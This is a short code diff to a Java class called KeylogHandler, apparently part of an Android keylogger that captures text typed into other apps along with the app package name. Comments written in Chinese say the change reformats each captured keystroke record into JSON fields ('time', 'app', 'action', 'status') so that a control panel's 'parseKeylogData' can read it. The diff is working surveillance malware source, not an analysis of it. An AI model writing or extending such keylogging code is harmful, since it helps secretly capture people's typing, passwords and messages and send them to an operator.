@@ -83,14 +83,13 @@ public class KeylogHandler {
             eventText = sb.toString();
         }
 
-        // 构建 JSON
+        // 构建 JSON — 对齐 Panel parseKeylogData 期望的字段
         JsonObject entry = new JsonObject();
+        entry.addProperty("time", new java.text.SimpleDateFormat(
+            "yyyy-MM-dd HH:mm:ss", java.util.Locale.US).format(new java.util.Date()));
         entry.addProperty("app", packageName);
-        entry.addProperty("cls", className);
-        entry.addProperty("text", editText);
-        entry.addProperty("before", beforeText);
-        entry.addProperty("event", eventText);
-        entry.addProperty("time", System.currentTimeMillis());
+        entry.addProperty("action", eventText);
+        entry.addProperty("status", "typed");
 
         JsonArray arr = new JsonArray();
         arr.add(entry);
